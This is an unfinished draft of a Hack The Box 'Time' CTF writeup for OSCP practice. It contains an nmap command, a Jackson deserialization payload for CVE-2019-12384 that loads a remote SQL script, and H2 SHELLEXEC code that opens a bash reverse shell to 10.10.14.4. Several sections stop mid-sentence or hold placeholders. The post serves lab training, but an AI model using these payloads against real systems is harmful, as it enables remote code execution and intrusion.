---
layout: post
title:  "Hack The Box - Time - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSCP"]
---
{% assign imgDir="HTB-Time-Writeup" %}

# Introduction
The hack the box machine "Time" is a Medium machine which is included in [TJnull's OSCP Preparation List](). Exploiting this machine requires knowledge in the areas of arbitrary file uploads, PHP comparisions

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover 

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.x`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that 

![nmap](/assets/{{ imgDir }}/nmap.png)


{% highlight none linenos %}
Placeholder
{% endhighlight %}

https://blog.doyensec.com/2019/07/22/jackson-gadgets.html

mode=2&data=["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.4/inject.sql'"}]

https://github.com/jas502n/CVE-2019-12384

CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('ping -c 10 10.10.14.4')


CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.4/443 0>&1')


<!-- TODO: Vulnerable to both CVE-2019-12384 and CVE-2017-7525? -->

# Privilege Escalation

